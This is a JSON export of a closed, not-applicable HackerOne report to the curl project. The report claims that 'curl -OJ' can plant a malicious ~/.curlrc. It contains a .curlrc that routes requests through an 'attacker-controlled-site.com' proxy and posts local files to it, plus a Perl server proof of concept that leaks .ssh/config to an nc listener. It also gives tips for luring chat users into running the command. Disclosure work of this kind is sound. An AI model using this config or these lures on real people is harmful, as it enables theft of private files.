{
  "id": 3135673,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTM1Njcz",
  "url": "https://hackerone.com/reports/3135673",
  "title": "curl -OJ allows creating custom .curlrc file which allows exfiltrating private data, among other things",
  "state": "Closed",
  "substate": "not-applicable",
  "severity_rating": "none",
  "readable_substate": "N/A",
  "created_at": "2025-05-08T15:53:37.376Z",
  "submitted_at": "2025-05-08T15:53:37.804Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "wolfsage",
    "url": "/wolfsage",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-07-01T14:07:45.274Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2025-06-28T12:22:03.644Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n\nIf someone convinces someone to use `curl -OJ http://example.com/somefile.txt`, the Content-Disposition header can be used to create a .curlrc file if one doesn't exist (and one is running curl from the home directory).\n\nFrom that point on, the attack controls any argument to all curl invocations.\n\nCombine this with the following .curlrc:\n\n```\nproxy = http://attacker-controlled-site.com\ndata = @/path/to/some/file\n```\n\nAnd the attacker can read whatever file(s) they wish from the user's system that the user has access to, as any curl request will send that to the proxy.\n\nNo AI was used (or ever will be!).\n\n## Affected version\n\ngit@16db059a93240dd7917728c2db55935f60a150ea\n\n```\ncurl 8.14.0-DEV (x86_64-pc-linux-gnu) libcurl/8.14.0-DEV OpenSSL/3.0.2 zlib/1.2.11 libpsl/0.21.0\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS HSTS HTTPS-proxy IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets\n```\n\n## Steps To Reproduce:\n\nPrereq: No existing ~/.curlrc, and running curl from home directory\n\n1. Run this perl server in one terminal, the key bit being in responds with an HTTP response like so:\n```\n    HTTP/1.1 200 Ok\n    Content-Disposition: filename=.curlrc\n\n    proxy = http://localhost:5555\n    data = @.ssh/config\n```\n\n```\nuse strict;\nuse warnings;\nuse IO::Socket qw(AF_INET AF_UNIX SOCK_STREAM SHUT_RDWR);\n\nmy $server = IO::Socket->new(\n  Domain    => AF_INET,\n  Type      => SOCK_STREAM,\n  Proto     => 'tcp',\n  LocalHost => '0.0.0.0',\n  LocalPort => 3333,\n  ReusePort => 1,\n  Listen => 5,\n) || die \"Can't open socket: $@\";\n\nprint \"Try http://127.0.0.1:3333\\n\\n\";\n\nwhile (1) {\n  my $client = $server->accept();\n\n  print \"Got a client\\n\";\n\n  # Read request and ignore\n  my $data = \"\";\n  $client->recv($data, 1024);\n\n  print \"Got a request: \\n\\n\" . $data =~ s/^/  /gmr;\n\n  $client->send(\"HTTP/1.1 200 OK\\r\\n\");\n  $client->send(<<~'EOF');\n    Content-Disposition: filename=.curlrc\n\n    proxy = http://localhost:5555\n    data = @.ssh/config\n    EOF\n\n  $client->shutdown(SHUT_RDWR);\n\n  print \"Responded\\n\\n\";\n}\n```\n\n2. In another terminal, run something to listen on a socket and print out what it sees (bsd nc for example):\n```\nnc -klp 5555\n```\n\n3. Run the first curl in the home directory which sets up the attack by writing out .curlrc:\n```\ncurl -OJ localhost:3333\n```\n\n4. Run curl again with any http url:\n```\ncurl google.com\n```\n\n... and you'll see the .ssh/config sent to the nc proxy\n\n## Impact\n\n## Summary:\n\nThis one still requires a little finessing from the attacker but seems much easier to achieve great harm with. You only need convince someone to do `curl -OJ http://example.com/some-thing.txt`\n\nand then nothing more (and eventually the user may run curl on their own), or when the person says \"That didn't work\" you can send them \"Oh, my mistake, I meant...\" and then send them something plausible.\n\nGetting folks to run a curl command is not particularly hard, especially hanging out in chat rooms on IRC, etc.\n\nMitigation for this one feels like...\n\n1. Curl shouldn't write hidden files with -J\n1. Curl with -J should maybe state what filename was written out\n1. -J's documentation should provide a harsher warning",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 6,
  "voters": [
    "zy9ard3",
    "2026",
    "thalaivar304",
    "omarjamailsa",
    "dansoappiah",
    "bilalhacker302"
  ],
  "severity": {
    "rating": "none",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
